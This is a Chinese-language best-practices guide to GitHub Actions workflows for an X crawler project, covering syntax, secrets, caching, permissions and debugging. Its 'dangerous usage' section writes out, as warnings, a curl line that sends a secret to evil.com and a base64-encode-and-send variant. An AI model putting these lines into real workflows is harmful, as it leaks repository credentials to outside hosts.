# GitHub Actions 最佳实践

本文档总结了使用 GitHub Actions 的最佳实践，特别针对本项目的 workflow 配置。

---

## 📋 目录

- [语法规则](#语法规则)
- [Secrets 使用](#secrets-使用)
- [性能优化](#性能优化)
- [安全实践](#安全实践)
- [调试技巧](#调试技巧)
- [常见错误](#常见错误)

---

## 🔧 语法规则

### 1. `if` 条件表达式

#### ✅ 正确写法

```yaml
# 方式 1: 完整包裹（推荐）
if: ${{ failure() && secrets.MY_SECRET != '' }}

# 方式 2: 简单条件可省略 ${{ }}（但不推荐混用）
if: failure()

# 方式 3: 检查 secret 是否存在
if: ${{ secrets.MY_SECRET != '' }}

# 方式 4: 组合多个条件
if: ${{ success() && github.ref == 'refs/heads/main' }}

# 方式 5: OR 条件
if: ${{ failure() || cancelled() }}
```

#### ❌ 错误写法

```yaml
# 错误: secrets 未包裹在 ${{ }} 中
if: failure() && secrets.MY_SECRET != ''

# 错误: 部分包裹
if: failure() && ${{ secrets.MY_SECRET != '' }}

# 错误: 字符串比较未加引号
if: ${{ github.ref == refs/heads/main }}
```

---

### 2. 使用 Secrets

#### ✅ 正确用法

```yaml
# 在环境变量中使用
- name: Configure environment
  run: |
    cat > .env << EOF
    API_KEY=${{ secrets.API_KEY }}
    EOF

# 通过 env 传递
- name: Run script
  env:
    API_KEY: ${{ secrets.API_KEY }}
  run: |
    python script.py

# 在条件中检查
- name: Optional step
  if: ${{ secrets.OPTIONAL_KEY != '' }}
  run: echo "Key exists"
```

#### ❌ 危险用法

```yaml
# 危险: 直接打印 secret（会被 GitHub 自动隐藏，但仍不安全）
- run: echo "${{ secrets.API_KEY }}"

# 危险: 发送到外部
- run: curl https://evil.com?key=${{ secrets.API_KEY }}

# 危险: Base64 编码后发送（可能绕过 GitHub 的保护）
- run: echo "${{ secrets.API_KEY }}" | base64 | curl ...
```

---

### 3. 环境变量

#### ✅ 最佳实践

```yaml
# Job 级别环境变量
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      NODE_ENV: production
      CACHE_VERSION: v1
    steps:
      - run: echo $NODE_ENV

# Step 级别环境变量
- name: Build
  env:
    BUILD_ID: ${{ github.run_number }}
  run: npm run build

# 从 secrets 加载
- name: Deploy
  env:
    API_KEY: ${{ secrets.API_KEY }}
    API_SECRET: ${{ secrets.API_SECRET }}
  run: ./deploy.sh
```

---

### 4. 工作流触发

#### 常用触发方式

```yaml
# 定时任务
on:
  schedule:
    - cron: '0 1 * * *'  # 每天 UTC 01:00

# 推送触发
on:
  push:
    branches: [ main, develop ]
    paths:
      - 'src/**'
      - '!**.md'

# PR 触发
on:
  pull_request:
    types: [ opened, synchronize, reopened ]

# 手动触发（带参数）
on:
  workflow_dispatch:
    inputs:
      environment:
        description: 'Environment to deploy'
        required: true
        type: choice
        options:
          - development
          - staging
          - production

# 多种触发方式组合
on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  schedule:
    - cron: '0 0 * * 0'  # 每周日午夜
  workflow_dispatch:
```

---

## 🔐 Secrets 使用

### 1. Secret 命名规范

```yaml
# ✅ 推荐命名
X_AUTH_TOKEN          # 服务前缀 + 类型
OPENROUTER_API_KEY    # 清晰的服务名
TELEGRAM_BOT_TOKEN    # 功能 + 类型
PROD_DATABASE_URL     # 环境 + 资源

# ❌ 不推荐
TOKEN                 # 太笼统
KEY1, KEY2           # 无意义
my_secret            # 不符合大写规范
```

### 2. Secret 检查模式

```yaml
# 模式 1: 检查是否非空
if: ${{ secrets.MY_SECRET != '' }}

# 模式 2: 使用默认值
env:
  API_URL: ${{ secrets.API_URL || 'https://api.default.com' }}

# 模式 3: 多个 secret 的逻辑判断
if: ${{ secrets.PRIMARY_KEY != '' || secrets.FALLBACK_KEY != '' }}
```

### 3. Secret 轮换策略

```bash
# 定期轮换检查清单
1. [ ] 生成新的 API key/token
2. [ ] 更新 GitHub Secret
3. [ ] 测试 workflow 运行
4. [ ] 确认无误后撤销旧的 key
5. [ ] 记录轮换日期
```

---

## ⚡ 性能优化

### 1. 使用缓存

```yaml
# Python 依赖缓存
- name: Set up Python
  uses: actions/setup-python@v5
  with:
    python-version: '3.11'
    cache: 'pip'  # 自动缓存 pip 依赖

# 手动缓存
- name: Cache dependencies
  uses: actions/cache@v3
  with:
    path: |
      ~/.cache/pip
      ~/.npm
    key: ${{ runner.os }}-deps-${{ hashFiles('**/requirements.txt') }}
    restore-keys: |
      ${{ runner.os }}-deps-

# 缓存自定义目录
- name: Cache data
  uses: actions/cache@v3
  with:
    path: crawler_data
    key: data-${{ github.run_number }}
```

### 2. 并行执行

```yaml
jobs:
  # 并行运行多个 job
  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: ['3.9', '3.10', '3.11']
    steps:
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python-version }}

  lint:
    runs-on: ubuntu-latest
    steps:
      - run: ruff check .

  # 两个 job 并行运行
  # test 和 lint 同时执行，互不等待
```

### 3. 条件执行

```yaml
# 只在主分支运行
- name: Deploy
  if: ${{ github.ref == 'refs/heads/main' }}
  run: ./deploy.sh

# 只在文件改变时运行
- name: Build docs
  if: ${{ contains(github.event.head_commit.modified, 'docs/') }}
  run: mkdocs build

# 根据提交信息决定
- name: Skip CI
  if: ${{ !contains(github.event.head_commit.message, '[skip ci]') }}
  run: npm test
```

### 4. 超时控制

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30  # Job 超时

    steps:
      - name: Long running task
        timeout-minutes: 10  # Step 超时
        run: ./long-script.sh
```

---

## 🛡️ 安全实践

### 1. 最小权限原则

```yaml
# 限制 GITHUB_TOKEN 权限
permissions:
  contents: read       # 只读代码
  issues: write        # 可写 issues
  pull-requests: none  # 不访问 PR

# 默认权限（不推荐用于生产）
permissions: write-all
```

### 2. 环境保护

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://example.com
    steps:
      - name: Deploy
        run: ./deploy.sh
```

在 GitHub Settings → Environments 中配置：
- Required reviewers（需要审批）
- Wait timer（等待时间）
- Deployment branches（限制分支）

### 3. 审计和监控

```yaml
# 记录关键操作
- name: Audit log
  run: |
    echo "Deployment by: ${{ github.actor }}"
    echo "Commit: ${{ github.sha }}"
    echo "Time: $(date -u +%Y-%m-%dT%H:%M:%SZ)"
    echo "Ref: ${{ github.ref }}"
```

### 4. Fork PR 保护

```yaml
# 自动设置（在 Settings → Actions → General）
# Fork pull request workflows from outside collaborators
# → Require approval for first-time contributors ✅

# 在 workflow 中检查来源
jobs:
  build:
    if: ${{ github.event_name != 'pull_request' || github.event.pull_request.head.repo.full_name == github.repository }}
```

---

## 🐛 调试技巧

### 1. 启用调试日志

```bash
# 在仓库设置 Secrets:
# ACTIONS_STEP_DEBUG = true
# ACTIONS_RUNNER_DEBUG = true
```

```yaml
# 或在 workflow 中临时启用
- name: Debug info
  run: |
    echo "::debug::This is a debug message"
    echo "::notice::This is a notice"
    echo "::warning::This is a warning"
    echo "::error::This is an error"
```

### 2. 输出调试信息

```yaml
- name: Debug context
  run: |
    echo "Event name: ${{ github.event_name }}"
    echo "Ref: ${{ github.ref }}"
    echo "Actor: ${{ github.actor }}"
    echo "Run number: ${{ github.run_number }}"
    echo "Job status: ${{ job.status }}"

# 输出完整 context
- name: Dump context
  env:
    GITHUB_CONTEXT: ${{ toJson(github) }}
    JOB_CONTEXT: ${{ toJson(job) }}
  run: |
    echo "$GITHUB_CONTEXT"
    echo "$JOB_CONTEXT"
```

### 3. 本地测试工具

```bash
# 使用 act 在本地运行 Actions
# https://github.com/nektos/act

# 安装
brew install act

# 运行 workflow
act

# 运行特定 job
act -j test

# 使用自定义 secrets
act -s GITHUB_TOKEN=xxx

# 列出所有 workflow
act -l
```

### 4. Step 输出和复用

```yaml
- name: Set output
  id: vars
  run: |
    echo "version=1.0.0" >> $GITHUB_OUTPUT
    echo "build_date=$(date +%Y%m%d)" >> $GITHUB_OUTPUT

- name: Use output
  run: |
    echo "Version: ${{ steps.vars.outputs.version }}"
    echo "Build date: ${{ steps.vars.outputs.build_date }}"

# 跨 job 使用
jobs:
  build:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.vars.outputs.version }}
    steps:
      - id: vars
        run: echo "version=1.0.0" >> $GITHUB_OUTPUT

  deploy:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ needs.build.outputs.version }}"
```

---

## ❌ 常见错误

### 1. Secret 访问错误

```yaml
# ❌ 错误: if 条件中 secrets 未包裹
if: failure() && secrets.TOKEN != ''

# ✅ 正确
if: ${{ failure() && secrets.TOKEN != '' }}
```

**错误信息:**
```
Unrecognized named-value: 'secrets'
```

### 2. 语法错误

```yaml
# ❌ 错误: 缩进不正确
steps:
- name: Test
run: echo "test"

# ✅ 正确
steps:
  - name: Test
    run: echo "test"
```

### 3. 引用未定义的输出

```yaml
# ❌ 错误: step 没有 id
- name: Build
  run: echo "version=1.0" >> $GITHUB_OUTPUT

- name: Use output
  run: echo "${{ steps.build.outputs.version }}"  # 失败！

# ✅ 正确
- name: Build
  id: build
  run: echo "version=1.0" >> $GITHUB_OUTPUT

- name: Use output
  run: echo "${{ steps.build.outputs.version }}"
```

### 4. 权限不足

```yaml
# ❌ 错误: 没有写权限但尝试推送
- run: |
    git add .
    git commit -m "update"
    git push  # 失败！

# ✅ 正确: 在 Settings → Actions → General
# → Workflow permissions
# → 选择 "Read and write permissions"
```

### 5. 环境变量作用域

```yaml
# ❌ 错误: 变量在另一个 step 中不可用
- name: Set var
  run: export MY_VAR=value

- name: Use var
  run: echo $MY_VAR  # 空！

# ✅ 正确: 使用 GITHUB_ENV
- name: Set var
  run: echo "MY_VAR=value" >> $GITHUB_ENV

- name: Use var
  run: echo $MY_VAR  # 正常
```

---

## 📚 实用技巧

### 1. 条件步骤执行

```yaml
# 总是运行（即使前面失败）
- name: Cleanup
  if: always()
  run: rm -rf temp/

# 只在成功时
- name: Deploy
  if: success()
  run: ./deploy.sh

# 只在失败时
- name: Notify failure
  if: failure()
  run: ./notify.sh

# 组合条件
- name: Deploy to prod
  if: ${{ success() && github.ref == 'refs/heads/main' }}
  run: ./deploy-prod.sh
```

### 2. 矩阵策略

```yaml
jobs:
  test:
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
        python: ['3.9', '3.10', '3.11']
        exclude:
          - os: macos-latest
            python: '3.9'
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/setup-python@v5
        with:
          python-version: ${{ matrix.python }}
```

### 3. 复用 Workflow

```yaml
# .github/workflows/reusable.yml
on:
  workflow_call:
    inputs:
      environment:
        required: true
        type: string
    secrets:
      token:
        required: true

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploying to ${{ inputs.environment }}"

# .github/workflows/main.yml
jobs:
  production:
    uses: ./.github/workflows/reusable.yml
    with:
      environment: production
    secrets:
      token: ${{ secrets.PROD_TOKEN }}
```

### 4. 制品上传下载

```yaml
# 上传
- name: Upload artifact
  uses: actions/upload-artifact@v4
  with:
    name: my-data
    path: |
      data/
      reports/
    retention-days: 7

# 下载
- name: Download artifact
  uses: actions/download-artifact@v4
  with:
    name: my-data
    path: ./downloaded/
```

---

## 🎯 项目特定建议

### 针对本 X Crawler 项目

#### 1. 敏感数据处理

```yaml
# ✅ 当前做法
- name: Configure environment
  run: |
    cat > .env << EOF
    X_AUTH_TOKEN=${{ secrets.X_AUTH_TOKEN }}
    EOF

# 避免直接在命令中使用
# ❌ 不要这样
- run: python crawler.py --token=${{ secrets.X_AUTH_TOKEN }}
```

#### 2. 定时任务优化

```yaml
# 考虑时区和频率
on:
  schedule:
    # 每天运行一次，避免频率过高
    - cron: '0 1 * * *'

    # 或工作日运行
    - cron: '0 1 * * 1-5'

# 避免整点运行（GitHub 负载高峰）
# ❌ 不推荐
- cron: '0 0 * * *'
# ✅ 推荐（错开几分钟）
- cron: '7 1 * * *'
```

#### 3. 数据管理

```yaml
# 定期清理旧数据（可选）
- name: Clean old data
  run: |
    # 保留最近 30 天
    find crawler_data/daily_posts -name "*.json" -mtime +30 -delete

    # 提交清理
    git add crawler_data/
    git commit -m "chore: 清理 30 天前的数据" || true
```

#### 4. 错误处理

```yaml
# 允许非关键步骤失败
- name: Generate summary
  continue-on-error: true
  run: python summarizer.py

# 失败后重试
- name: Fetch data
  uses: nick-fields/retry@v2
  with:
    timeout_minutes: 10
    max_attempts: 3
    retry_wait_seconds: 60
    command: python crawler.py
```

---

## 📖 参考资源

### 官方文档

- [GitHub Actions 文档](https://docs.github.com/en/actions)
- [Workflow 语法](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions)
- [Context 和表达式](https://docs.github.com/en/actions/learn-github-actions/contexts)
- [加密 Secrets](https://docs.github.com/en/actions/security-guides/encrypted-secrets)

### 工具

- [act](https://github.com/nektos/act) - 本地运行 Actions
- [actionlint](https://github.com/rhysd/actionlint) - Workflow 语法检查
- [super-linter](https://github.com/github/super-linter) - 代码质量检查

### 市场

- [GitHub Actions Marketplace](https://github.com/marketplace?type=actions)
- [Awesome Actions](https://github.com/sdras/awesome-actions)

---

## ✅ 检查清单

完成 workflow 配置后，使用此清单验证：

### 基础配置
- [ ] 所有 secrets 已配置
- [ ] Workflow 语法无错误
- [ ] 权限设置正确（read/write）
- [ ] 触发条件符合预期

### 安全性
- [ ] 没有直接打印 secrets
- [ ] Fork PR 无法访问敏感信息
- [ ] 使用最小权限原则
- [ ] 定期轮换 secrets

### 性能
- [ ] 使用了依赖缓存
- [ ] 避免不必要的步骤执行
- [ ] 设置了合理的超时时间
- [ ] 并行执行独立任务

### 可维护性
- [ ] 代码有清晰的注释
- [ ] 使用有意义的 step 名称
- [ ] 错误处理完善
- [ ] 有失败通知机制

### 测试
- [ ] 手动触发测试通过
- [ ] 定时任务按预期运行
- [ ] 失败通知正常工作
- [ ] 数据正确保存

---

*最后更新: 2025-10-10*
*如有疑问，参考 [GitHub Actions 文档](https://docs.github.com/en/actions)*
